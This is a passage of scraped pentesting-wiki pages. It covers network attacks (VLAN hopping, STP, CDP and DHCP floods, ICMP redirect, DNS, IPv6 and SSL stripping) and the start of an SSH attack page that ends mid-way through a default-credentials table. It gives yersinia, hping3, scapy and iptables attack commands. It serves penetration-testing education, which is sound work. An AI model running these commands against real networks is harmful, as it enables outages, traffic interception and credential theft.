designated VLAN and the VLAN of the victim and send a packet. As the\nvictim won't be able to connect back\nwith the attacker, so the\nbest option for the attacker is communicate via UDP\nto protocols that can perform some interesting actions (like SNMP).\nAnother option for the attacker is to launch a\nTCP port scan spoofing an IP controlled by the attacker and accessible by the victim\n(probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.\nTo perform this attack you could use scapy:\npip install scapy\nfrom\nscapy\n.\nall\nimport\n*\n# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)\npacket\n=\nEther\n()\n/\nDot1Q\n(\nvlan\n=\n1\n)\n/\nDot1Q\n(\nvlan\n=\n20\n)\n/\nIP\n(\ndst\n=\n'192.168.1.10'\n)\n/\nICMP\n()\nsendp\n(\npacket\n)\nLateral VLAN Segmentation Bypass\nIf you have\naccess to a switch that you are directly connected to\n, you have the ability to\nbypass VLAN segmentation\nwithin the network. Simply\nswitch the port to trunk mode\n(otherwise known as trunk), create virtual interfaces with the IDs of the target VLANs, and configure an IP address. You can try requesting the address dynamically (DHCP) or you can configure it statically. It depends on the case.\nLateral VLAN Segmentation Bypass\nLayer 3 Private VLAN Bypass\nIn guest wireless networks and other environments, private VLAN (also known as\nport isolation\n) settings are used to\nprevent peers from interacting\n(i.e., clients\nconnect to a wireless access point but cannot address one another\n). Depending on network ACLs (or lack thereof), it might be possible to send IP packets up to a router, which are then forwarded back to a neighbouring peer.\nThis attack will send a\nspecially crafted packet to the IP of a client but with the MAC of the router\n. Then, the\nrouter will redirect the packet to the client\n. As in\nDouble Tagging Attacks\nyou can exploit this vulnerability by controlling a host accessible by the victim.\nVTP Attacks\nVTP (VLAN Trunking Protocol)\nis a protocol designed to centrally manage VLANs. To keep track of the current VLAN database, switches check special revision numbers. When any table update occurs, the revision number is incremented by one. And if a switch detects a configuration with a higher revision number, it will automatically update its VLAN database.\nRoles in a VTP domain\nVTP Server.\nA switch in the VTP Server role can create new VLANs, delete old ones, or change information in the VLANs themselves.\nIt also generates VTP announcements for the rest of the domain members.\nVTP Client.\nA switch in this role will receive specific VTP announcements from other switches in the domain to update the VLAN databases on its own. Clients are limited in their ability to create VLANs and are not even allowed to change the VLAN configuration locally. In other words,\nread only access.\nVTP Transparent.\nIn this mode, the switch does not participate in VTP processes and can host full and local administration of the entire VLAN configuration. When operating in transparent mode, switches only transmit VTP announcements from other switches without affecting their VLAN configuration.\nSuch switches will always have a revision number of zero and cannot be attacked.\nAdvertisement types\nSummary Advertisement —\nthe VTP announcement that the VTP server sends every\n300 seconds (5 minutes).\nThis announcement stores the VTP domain name, protocol version, timestamp, and MD5 configuration hash value.\nSubset Advertisement —\nthis is the VTP advertisement that is sent whenever a VLAN configuration change occurs.\nAdvertisement Request —\nis a request from the VTP client to the VTP server for a Summary Advertisement message. Usually sent in response to a message that a switch has detected a Summary Advertisement with a higher configuration revision number.\nVTP can\nonly be attacked from a trunk port,\nbecause\nVTP announcements are only broadcast and received on trunk ports.\nTherefore, when pentesting after attacking DTP, your next target could be VTP.\nTo attack the VTP domain you can\nuse Yersinia\nto\nrun a VTP inject that will erase the entire VLAN\ndatabase\nand thus paralyze the network.\nThe VTP protocol has as many as\nthree versions\n. In this post the attack is against the first version, VTPv1\nyersinia\n-G\n#For graphic mode\nTo erase the entire VLAN database, select the\ndeleting all VTP vlans\noption\nSTP Attacks\nIf you cannot capture BPDU frames on your interfaces, it is unlikely that you will succeed in an STP attack.\nSTP BPDU DoS\nSending a lot of BPDUs TCP (Topology Change Notification) or Conf (the BPDUs that are sent when the topology is created) the switches are overloaded and stop working correctly.\nyersinia stp\n-attack\n2\nyersinia stp\n-attack\n3\n#Use -M to disable MAC spoofing\nSTP TCP Attack\nWhen a TCP is sent, the CAM table of the switches will be deleted in 15s. Then, if you are sending continuously this kind of packets, the CAM table will be restarted continuously (or every 15segs) and when it is restarted, the switch behaves as a hub\nyersinia stp\n-attack\n1\n#Will send 1 TCP packet and the switch should restore the CAM in 15 seconds\nyersinia stp\n-attack\n0\n#Will send 1 CONF packet, nothing else will happen\nSTP Root Attack\nThe attacker simulates the behaviour of a switch to become the STP root of the network. Then, more data will pass through him. This is interesting when you are connected to two different switches.\nThis is done by sending BPDUs CONF packets saying that the\npriority\nvalue is less than the actual priority of the actual root switch.\nyersinia stp\n-attack\n4\n#Behaves like the root switch\nyersinia stp\n-attack\n5\n#This will make the device behaves as a switch but will not be root\nIf the attacker is connected to 2 switches he can be the root of the new tree and all the traffic between those switches will pass through him\n(a MITM attack will be performed).\nyersinia stp\n-attack\n6\n#This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets \"Sniff\" --> \"Bridged sniffing\"\nettercap\n-T\n-i\neth1\n-B\neth2\n-q\n#Set a bridge between 2 interfaces to forwardpackages\nCDP Attacks\nCISCO Discovery Protocol is the protocol used by CISCO devices to talk among them,\ndiscover who is alive\nand what features does they have.\nInformation Gathering\nBy default, the CDP sends announcements to all its ports.\nBut what if an intruder connects to a port on the same switch? Using a network sniffer, be it\nWireshark,\ntcpdump\nor\nYersinia\n, he could extract\nvaluable information about the device itself\n, from its model to the Cisco IOS version. Using this information he will be able to enumerate the same version of Cisco IOS and find the vulnerability and then exploit it.\nCDP Flooding Attack\nYou can make a DoS attack to a CISCO switch by exhausting the device memory simulating real CISCO devices.\nsudo\nyersinia cdp\n-attack\n1\n#DoS Attack simulating new CISCO devices\n# Or you could use the GUI\nsudo\nyersinia\n-G\nSelect the\nflooding CDP table\noption and start the attack. The switch CPU will be overloaded, as well as the CDP neighbor table,\nresulting in “network paralysis”.\nCDP Impersonation Attack\nsudo\nyersinia cdp\n-attack\n2\n#Simulate a new CISCO device\nsudo\nyersinia cdp\n-attack\n0\n#Send a CDP packet\nYou could also use\nscapy\n. Be sure to install it with\nscapy/contrib\npackage.\nVoIP Attacks\nAlthough intended for use by the employees’ Voice over Internet Protocol (VoIP) phones, modern VoIP devices are increasingly integrated with IoT devices. Many employees can now unlock doors using a special phone number, control the room’s thermostat...\nThe tool\nvoiphopper\nmimics the behavior of a VoIP phone in Cisco, Avaya, Nortel, and Alcatel-Lucent environments. It automatically discovers the correct VLAN ID for the voice network using one of the device discovery protocols it supports, such as the Cisco Discovery Protocol (CDP), the Dynamic Host Configuration Protocol (DHCP), Link Layer Discovery Protocol Media Endpoint Discovery (LLDP-MED), and 802.1Q ARP.\nVoIP Hopper\nsupports\nthree\nCDP modes. The\nsniff\nmode inspects the network packets and attempts to locate the VLAN ID. To use it, set the\n-c\nparameter to\n0\n. The\nspoof\nmode generates custom packets similar to the ones a real VoIP device would transmit in the corporate network. To use it, set the\n-c\nparameter to\n1\n. The spoof with a\npre-madepacket\nmode sends the same packets as a Cisco 7971G-GE IP phone. To use it, set the\n-c\nparameter to\n2\n.\nWe use the last method because it’s the fastest approach. The\n-i\nparameter specifies the attacker’s\nnetwork\ninterface\n, and the\n-E\nparameter specifies the\nname of the VOIP device\nbeing imitated. We chose the name SEP001EEEEEEEEE, which is compatible with the Cisco naming format for VoIP phones. The format consists of the word “SEP” followed by a MAC address. In corporate environments, you can imitate an existing VoIP device by looking at the MAC label on the back of the phone; by pressing the Settings button and selecting the Model Information option on the phone’s display screen; or by attaching the VoIP device’s Ethernet cable to your laptop and observing the device’s CDP requests using Wireshark.\nvoiphopper\n-i\neth1\n-E\n'SEP001EEEEEEEEE '\n-c\n2\nIf the tool executes successfully, the\nVLAN network will assign an IPv4 address to the attacker’s device\n.\nDHCP Attacks\nEnumeration\nnmap\n--script\nbroadcast-dhcp-discover\nStarting Nmap\n7.80\n(\nhttps://nmap.org\n)\nat\n2019\n-10-16 05:30 EDT\nWARNING: No targets were specified, so\n0\nhosts scanned.\nPre-scan script results:\n|\nbroadcast-dhcp-discover:\n|\nResponse\n1\nof\n1\n:\n|\nIP Offered:\n192.168\n.1.250\n|\nDHCP Message Type: DHCPOFFER\n|\nServer Identifier:\n192.168\n.1.1\n|\nIP Address Lease Time: 1m00s\n|\nSubnet Mask:\n255.255\n.255.0\n|\nRouter:\n192.168\n.1.1\n|\nDomain Name Server:\n192.168\n.1.1\n|\n_    Domain Name: mynet\nNmap done:\n0\nIP addresses\n(\n0\nhosts up\n)\nscanned\nin\n5.27\nseconds\nDoS\nTwo types of DoS\ncould be performed against DHCP servers. The first one consists on\nsimulate enough fake hosts to use all the possible IP addresses\n.\nThis attack will work only if you can see the responses of the DHCP server and complete the protocol (\nDiscover\n(Comp) -->\nOffer\n(server) -->\nRequest\n(Comp) -->\nACK\n(server)). For example, this is\nnot possible in Wifi networks\n.\nAnother way to perform a DHCP DoS is to send a\nDHCP-RELEASE packet using as source code every possible IP\n. Then, the server will think that everybody has finished using the IP.\nyersinia dhcp\n-attack\n1\nyersinia dhcp\n-attack\n3\n#More parameters are needed\nA more automatic way of doing this is using the tool\nDHCPing\n​\nYou could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect,\nyou can server malicious values mentioned in the next attack\n.\nSet malicious values\nYou can use Responder DHCP script (\n/usr/share/responder/DHCP.py\n) to establish a rogue DHCP server. Setting a malicious gateway is not ideal, because the hijacked connection is only half-duplex (i.e., we capture egress packets from the client, but not the responses from the legitimate gateway). As such, I would recommend setting a rogue DNS or WPAD server to capture HTTP traffic and credentials in particular.\nDescription\nExample\nOur IP address, advertised as a gateway\n-i 10.0.0.100\nThe local DNS domain name (optional)\n-d example.org\nIP address of the original router/gateway\n-r 10.0.0.1\nPrimary DNS server IP address\n-p 10.0.0.100\nSecondary DNS server IP address (optional)\n-s 10.0.0.1\nThe netmask of the local network\n-n 255.255.255.0\nThe interface to listen for DHCP traffic on\n-I eth1\nWPAD configuration address (URL)\n-w “\nhttp://10.0.0.100/wpad.dat\\n”\n​\nSpoof the default gateway IP address\n-S\nRespond to all DHCP requests (very noisy)\n-R\nEAP Attacks\nHere are some of the attack tactics that can be used against 802.1X implementations:\nActive brute-force password grinding via EAP\nAttacking the RADIUS server with malformed EAP content\n**\n(exploits)\nEAP message capture and offline password cracking (EAP-MD5 and PEAP)\nForcing EAP-MD5 authentication to bypass TLS certificate validation\nInjecting malicious network traffic upon authenticating using a hub or similar\nIf the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:\neapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt\nFHRP (GLBP & HSRP) Attacks\nFHRP\n(First Hop Redundancy Protocol) is a class of network protocols designed to\ncreate a hot redundant routing system\n. With FHRP, physical routers can be combined into a single logical device, which increases fault tolerance and helps distribute the load.\nCisco Systems engineers have developed two FHRP protocols, GLBP and HSRP.\nGLBP & HSRP Attacks\nRIP\nThree versions of the Routing Information Protocol (RIP) exist—RIP, RIPv2, and RIPng. RIP and RIPv2 use UDP datagrams sent to peers via port 520, whereas RIPng broadcasts datagrams to UDP port 521 via IPv6 multicast. RIPv2 introduced MD5 authentication support. RIPng does not incorporate native authentication; rather, it relies on optional IPsec AH and ESP headers within IPv6.\nFor more information about how to attack this protocol go to the book\nNetwork Security Assessment: Know Your Network (3rd edition).\nEIGRP Attacks\nEIGRP (Enhanced Interior Gateway Routing Protocol)\nis a dynamic routing protocol.\nIt is a distance-vector protocol.\nIf there is\nno authentication\nand configuration of passive interfaces, an\nintruder\ncan interfere with EIGRP routing and cause\nrouting tables poisoning\n. Moreover, EIGRP network (in other words, autonomous system)\nis flat and has no segmentation into any zones\n. If an\nattacker injects a route\n, it is likely that this route will\nspread\nthroughout the autonomous EIGRP system.\nTo attack a EIGRP system requires\nestablishing a neighbourhood with a legitimate EIGRP route\nr, which opens up a lot of possibilities, from basic reconnaissance to various injections.\n****\nFRRouting\nallows you to implement\na virtual router that supports BGP, OSPF, EIGRP, RIP and other protocols.\nAll you need to do is deploy it on your attacker’s system and you can actually pretend to be a legitimate router in the routing domain.\nEIGRP Attacks\n****\nColy\nalso supports capture of EIGRP broadcasts and injection of packets to manipulate routing configuration. For more info about how to attack it with Coly check\nNetwork Security Assessment: Know Your Network (3rd edition).\nOSPF\nMost Open Shortest Path First (OSPF) implementations use MD5 to provide authentication between routers. Loki and John the Ripper can capture and attack MD5 hashes to reveal the key, which can then be used to advertise new routes. The route parameters are set by using the\nInjection\ntab, and the key set under\nConnection\n.\nFor more information about how to attack this protocol go to the book\nNetwork Security Assessment: Know Your Network (3rd edition).\nOther Generic Tools & Sources\n​\nAbove\n: Tool to scan network traffic and find vulnerabilities\nYou can find some more information about network attacks\nhere\n.\n(TODO: Read it all and all new attacks if any)\nSpoofing\nThe attacker configures all the network parameters (GW, IP, DNS) of the new member of the network sending fake DHCP responses.\nEttercap\nyersinia dhcp\n-attack\n2\n#More parameters are needed\nARP Spoofing\nCheck the\nprevious section\n.\nICMPRedirect\nICMP Redirect consist on sending an ICMP packet type 1 code 5 that indicates that the attacker is the best way to reach an IP. Then, when the victim wants to contact the IP, it will send the packet through the attacker.\nEttercap\nicmp_redirect\nhping3\n[\nVICTIM IP ADDRESS\n]\n-C\n5\n-K\n1\n-a\n[\nVICTIM DEFAULT GW IP ADDRESS\n]\n--icmp-gw\n[\nATTACKER IP ADDRESS\n]\n--icmp-ipdst\n[\nDST IP ADDRESS\n]\n--icmp-ipsrc\n[\nVICTIM IP ADDRESS\n]\n#Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]\nDNS Spoofing\nThe attacker will resolve some (or all) the domains that the victim ask for.\nset\ndns.spoof.hosts ./dns.spoof.hosts\n;\ndns.spoof on\nConfigure own DNS with dnsmasq\napt-get\ninstall\ndnsmasqecho\n\"addn-hosts=dnsmasq.hosts\"\n>\ndnsmasq.conf\n#Create dnsmasq.confecho \"127.0.0.1   domain.example.com\" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon\ndig\n@localhost domain.example.com\n# Test the configured DNS\nLocal Gateways\nMultiple routes to systems and networks often exist. Upon building a list of MAC addresses within the local network, use\ngateway-finder.py\nto identify hosts that support IPv4 forwarding.\nroot@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git\nroot@kali:~# cd gateway-finder/\nroot@kali:~# arp-scan -l | tee hosts.txt\nInterface: eth0, datalink type: EN10MB (Ethernet)\nStarting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)\n10.0.0.100     00:13:72:09:ad:76       Dell Inc.\n10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION\n10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.\n​\nroot@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99\ngateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder\n[+] Using interface eth0 (-I to change)\n[+] Found 3 MAC addresses in hosts.txt\n[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]\n[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]\n​\nSpoofing LLMNR, NBT-NS, and mDNS\n​\nMicrosoft systems use Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS) for local host resolution when DNS lookups fail. Apple Bonjour and Linux zero-configuration implementations use Multicast DNS (mDNS) to discover systems within a network. These protocols are unauthenticated and broadcast messages over UDP; thus, attackers can exploit them to direct users to malicious services.\nYou can impersonate services that are searched by hosts using Responder to send fake responses.\nRead here more information about\nhow to Impersonate services with Responder\n.\n​\nSpoofing WPAD\n​\nMany browsers use Web Proxy Auto-Discovery (WPAD) to load proxy settings from the network. A WPAD server provides client proxy settings via a particular URL (e.g.,\nhttp://wpad.example.org/wpad.dat\n) upon being identified through any of the following:\nDHCP, using a code 252 entry\n34\n​\nDNS, searching for the\nwpad\nhostname in the local domain\nMicrosoft LLMNR and NBT-NS (in the event of DNS lookup failure)\nResponder automates the WPAD attack—running a proxy and directing clients to a malicious WPAD server via DHCP, DNS, LLMNR, and NBT-NS.\nRead here more information about\nhow to Impersonate services with Responder\n.\n​\nSpoofing SSDP and UPnP devices\n​\nYou can offer different services in the network to try to\ntrick a user\nto enter some\nplain-text credentials\n.\nMore information about this attack in\nSpoofing SSDP and UPnP Devices\n.\nIPv6 Neighbor Spoofing\nThis attack is very similar to ARP Spoofing but in the IPv6 world. You can get the victim think that the IPv6 of the GW has the MAC of the attacker.\nsudo\nparasite6\n-l\neth0\n# This option will respond to every requests spoofing the address that was requested\nsudo\nfake_advertise6\n-r\n-w\n2\neth0\n<\nRouter_IPv\n6\n>\n#This option will send the Neighbor Advertisement packet every 2 seconds\nIPv6 Router Advertisement Spoofing/Flooding\nSome OS configure by default the gateway from the RA packets sent in the network. To declare the attacker as IPv6 router you can use:\nsysctl\n-w\nnet.ipv6.conf.all.forwarding\n=\n1\n4\nip\nroute\nadd\ndefault via\n<\nROUTER_IPv\n6\n>\ndev wlan0\nfake_router6 wlan0 fe80::01/16\nIPv6 DHCP spoofing\nBy default some OS try to configure the DNS reading a DHCPv6 packet in the network. Then, an attacker could send a DHCPv6 packet to configure himself as DNS. The DHCP also provides an IPv6 to the victim.\ndhcp6.spoof on\ndhcp6.spoof.domains\n<\nlist of domains\n>\n​\nmitm6\nHTTP (fake page and JS code injection)\nInternet Attacks\nsslStrip\nBasically what this attack does is, in case the\nuser\ntry to\naccess\na\nHTTP\npage that is\nredirecting\nto the\nHTTPS\nversion.\nsslStrip\nwill\nmaintain\na\nHTTP connection with\nthe\nclient and\na\nHTTPS connection with\nthe\nserver\nso it ill be able to\nsniff\nthe connection in\nplain text\n.\napt-get\ninstall\nsslstrip\nsslstrip\n-w\n/tmp/sslstrip.log\n--all\n- l\n10000\n-f\n-k\n#iptables --flush\n#iptables --flush -t nat\niptables\n-t\nnat\n-A\nPREROUTING\n-p\ntcp --destination-port\n80\n-j\nREDIRECT --to-port\n10000\niptables\n-A\nINPUT\n-p\ntcp --destination-port\n10000\n-j\nACCEPT\nMore info\nhere\n.\nsslStrip+ and dns2proxy for bypassing HSTS\nThe\ndifference\nbetween\nsslStrip+ and dns2proxy\nagainst\nsslStrip\nis that they will\nredirect\nfor example\nwww.facebook.com\nto\nwwww.facebook.com\n(note the\nextra\n\"\nw\n\") and will set the\naddress of this domain as the attacker IP\n. This way, the\nclient\nwill\nconnect\nto\nwwww.facebook.com\n(the attacker)\nbut behind the scenes\nsslstrip+\nwill\nmaintain\nthe\nreal connection\nvia https with\nwww.facebook.com\n.\nThe\ngoal\nof this technique is to\navoid HSTS\nbecause\nwwww\n.facebook.com\nwon't\nbe saved in the\ncache\nof the browser, so the browser will be tricked to perform\nfacebook authentication in HTTP\n.\nNote that in order to perform this attack the victim has to try to access initially to\nhttp://www.faceook.com\nand not https. This can be done modifying the links inside an http page.\nMore info\nhere\n,\nhere\nand\nhere\n.\nsslStrip or sslStrip+ doesn;t work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an \"important\" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag\nincludeSubdomains\nso the\nwwww.facebook.com\nexample from before won't work anymore as\nfacebook.com\nuses HSTS with\nincludeSubdomains\n.\nTODO: easy-creds, evilgrade, metasploit, factory\nTCP listen in port\nsudo nc -l -p 80\nsocat TCP4-LISTEN:80,fork,reuseaddr -\nTCP + SSL listen in port\nGenerate keys and self-signed certificate\nFILENAME=server\n# Generate a public/private key pair:\nopenssl genrsa -out $FILENAME.key 1024\n# Generate a self signed certificate:\nopenssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt\n# Generate the PEM file by just appending the key and certificate files:\ncat $FILENAME.key $FILENAME.crt >$FILENAME.pem\nListen using certificate\nsudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -\nListen using certificate and redirect to the hosts\nsudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0\nSome times, if the client checks that the CA is a valid one, you could\nserve a certificate of other hostname signed by a CA\n.\nAnother interesting test, is to serve a c\nertificate of the requested hostname but self-signed\n.\nOther things to test is to try to sign the certificate with a valid certificate that it is not a valid CA. Or to use the valid public key, force to use an algorithm as diffie hellman (one that do not need to decrypt anything with the real private key) and when the client request a probe of the real private key (like a hash) send a fake probe and expect that the client does not check this.\nBettercap\n# Events\nevents.stream off\n#Stop showing events\nevents.show\n#Show all events\nevents.show\n5\n#Show latests 5 events\nevents.clear\n​\n# Ticker (loop of commands)\nset\nticker.period\n5\n;\nset\nticker.commands\n\"wifi.deauth DE:AD:BE:EF:DE:AD\"\n;\nticker on\n​\n# Caplets\ncaplets.show\ncaplets.update\n​\n# Wifi\nwifi.recon on\nwifi.deauth BSSID\nwifi.show\n# Fake wifi\nset\nwifi.ap.ssid Banana\nset\nwifi.ap.bssid DE:AD:BE:EF:DE:AD\nset\nwifi.ap.channel\n5\nset\nwifi.ap.encryption\nfalse\n#If true, WPA2\nwifi.recon on\n;\nwifi.ap\nActive Discovery Notes\nTake into account that when a UDP packet is sent to a device that do not have the requested port an ICMP (Port Unreachable) is sent.\nARP discover\nARP packets are used to discover wich IPs are being used inside the network. The PC has to send a request for each possible IP address and only the ones that are being used will respond.\nmDNS (multicast DNS)\nBettercap send a MDNS request (each X ms) asking for\n_services_.dns-sd._udp.local\nthe machine that see this paket usually answer this request. Then, it only searchs for machine answering to \"services\".\nTools\nAvahi-browser (--all)\nBettercap (net.probe.mdns)\nResponder\nNBNS (NetBios Name Server)\nBettercap broadcast packets to the port 137/UDP asking for the name \"CKAAAAAAAAAAAAAAAAAAAAAAAAAAA\".\nSSDP (Simple Service Discovery Protocol)\nBettercap broadcast SSDP packets searching for all kind of services (UDP Port 1900).\nWSD (Web Service Discovery)\nBettercap broadcast WSD packets searching for services (UDP Port 3702).\nReferences\n​\nhttps://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9\n​\n​\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\n​\n☁️ HackTricks Cloud ☁️\n-\n🐦 Twitter 🐦\n-\n🎙️ Twitch 🎙️\n-\n🎥 Youtube 🎥\n​\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nGet the\nofficial PEASS & HackTricks swag\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n​\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nGithub Dorks & Leaks\nNext\nDHCPv6\nLast modified\n19d ago"
    },
    {
        "title": "HackTricks Pentesting Services",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh",
        "text": "22 - Pentesting SSH/SFTP\n​\n☁️ HackTricks Cloud ☁️\n-\n🐦 Twitter 🐦\n-\n🎙️ Twitch 🎙️\n-\n🎥 Youtube 🎥\n​\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nGet the\nofficial PEASS & HackTricks swag\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n​\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n​\n​\nIf you are interested in\nhacking career\nand hack the unhackable -\nwe are hiring!\n(\nfluent polish written and spoken required\n).\nCareers | stmcyber.com | penetration testing\nstmcyber.com\nBasic Information\nSSH or Secure Shell or Secure Socket Shell,\nis a network protocol that gives users a\nsecure way to access a computer over an unsecured network.\nDefault port:\n22\n22/tcp open  ssh     syn-ack\nSSH servers:\n​\nopenSSH\n– OpenBSD SSH, shipped in BSD, Linux distributions and Windows since Windows 10\n​\nDropbear\n– SSH implementation for environments with low memory and processor resources, shipped in OpenWrt\n​\nPuTTY\n– SSH implementation for Windows, the client is commonly used but the use of the server is rarer\n​\nCopSSH\n– implementation of OpenSSH for Windows\nSSH libraries (implementing server-side):\n​\nlibssh\n– multiplatform C library implementing the SSHv2 protocol with bindings in\nPython\n,\nPerl\nand\nR\n; it’s used by KDE for sftp and by GitHub for the git SSH infrastructure\n​\nwolfSSH\n– SSHv2 server library written in ANSI C and targeted for embedded, RTOS, and resource-constrained environments\n​\nApache MINA SSHD\n– Apache SSHD java library is based on Apache MINA\n​\nparamiko\n– Python SSHv2 protocol library\nEnumeration\nBanner Grabbing\nnc\n-vn\n<\nIP\n>\n22\nAutomated ssh-audit\nssh-audit is a tool for ssh server & client configuration auditing.\n​\nhttps://github.com/jtesta/ssh-audit\nis an updated fork from\nhttps://github.com/arthepsy/ssh-audit/\n​\nFeatures:\nSSH1 and SSH2 protocol server support;\nanalyze SSH client configuration;\ngrab banner, recognize device or software and operating system, detect compression;\ngather key-exchange, host-key, encryption and message authentication code algorithms;\noutput algorithm information (available since, removed/disabled, unsafe/weak/legacy, etc);\noutput algorithm recommendations (append or remove based on recognized software version);\noutput security information (related issues, assigned CVE list, etc);\nanalyze SSH version compatibility based on algorithm information;\nhistorical information from OpenSSH, Dropbear SSH and libssh;\nruns on Linux and Windows;\nno dependencies\nusage: ssh-audit.py\n[\n-1246pbcnjvlt\n]\n<\nhost\n>\n​\n-1,\n--ssh1\nforce\nssh\nversion\n1\nonly\n-2,\n--ssh2\nforce\nssh\nversion\n2\nonly\n-4,\n--ipv4\nenable\nIPv4\n(\norder of precedence\n)\n-6,\n--ipv6\nenable\nIPv6\n(\norder of precedence\n)\n-p,\n--port\n=<\nport\n>\nport to connect\n-b,\n--batch\nbatch output\n-c,  --client-audit     starts a server on port\n2222\nto audit client\nsoftware config\n(\nuse\n-p\nto change port\n;\nuse\n-t\nto change\ntimeout\n)\n-n,  --no-colors        disable colors\n-j,\n--json\nJSON output\n-v,\n--verbose\nverbose output\n-l,\n--level\n=<\nlevel\n>\nminimum output level\n(\ninfo\n|\nwarn\n|\nfail\n)\n-t,\n--timeout\n=<\nsecs\n>\ntimeout\n(\nin seconds\n)\nfor\nconnection and reading\n(\ndefault:\n5\n)\n$ python3 ssh-audit\n<\nIP\n>\n​\nSee it in action (Asciinema)\n​\nPublic SSH key of server\nssh-keyscan\n-t\nrsa\n<\nIP\n>\n-p\n<\nPORT\n>\nWeak Cipher Algorithms\nThis is discovered by default by\nnmap\n. But you can also use\nsslcan\nor\nsslyze\n.\nNmap scripts\nnmap\n-p22\n<\nip\n>\n-sC\n# Send default nmap scripts for SSH\nnmap\n-p22\n<\nip\n>\n-sV\n# Retrieve version\nnmap\n-p22\n<\nip\n>\n--script\nssh2-enum-algos\n# Retrieve supported algorythms\nnmap\n-p22\n<\nip\n>\n--script\nssh-hostkey --script-args\nssh_hostkey\n=\nfull\n# Retrieve weak keys\nnmap\n-p22\n<\nip\n>\n--script\nssh-auth-methods --script-args\n=\n\"ssh.user=root\"\n# Check authentication methods\nShodan\nssh\nBrute force usernames, passwords and private keys\nUsername Enumeration\nIn some versions of OpenSSH you can make a timing attack to enumerate users. You can use a metasploit module in order to exploit this:\nmsf> use scanner/ssh/ssh_enumusers\n​\nBrute force\n​\nSome common ssh credentials\nhere\nand\nhere\nand below.\nPrivate Key Brute Force\nIf you know some ssh private keys that could be used... let's try it. You can use the nmap script:\nhttps://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html\nOr the MSF auxiliary module:\nmsf> use scanner/ssh/ssh_identify_pubkeys\nOr use\nssh-keybrute.py\n(native python3, lightweight and has legacy algorithms enabled):\nsnowdroppe/ssh-keybrute\n.\nKnown badkeys can be found here:\nssh-badkeys/authorized at master · rapid7/ssh-badkeys\nGitHub\nWeak SSH keys / Debian predictable PRNG\nSome systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced. Pre-generated sets of keys generated on Debian systems affected by weak PRNG are available here:\ng0tmi1k/debian-ssh\n.\nYou should look here in order to search for valid keys for the victim machine.\nKerberos\ncrackmapexec\nusing the\nssh\nprotocol can use the option\n--kerberos\nto\nauthenticate via kerberos\n.\nFor more info run\ncrackmapexec ssh --help\n.\nDefault Credentials\nVendor\nUsernames\nPasswords\nAPC\napc, device\napc\nBrocade\nadmin\nadmin123, password, brocade, fibranne\nCisco\nadmin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin\nadmin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme\nCitrix\nroot, nsroot, nsmaint, vdiadmin, kvm, cli, admin\nC1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler\nD-Link\nadmin, user\nprivate, admin, user\nDell\nroot, user1, admin, vkernel, cli\ncalvin, 123456, password, vkernel, Stor@ge!, admin\nEMC\nadmin, root, sysadmin\nEMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc\nHP/3Com\nadmin, root, vcx, app, spvar, manage, hpsupport, opc_op\nadmin, password, hpinvent, iMC123, 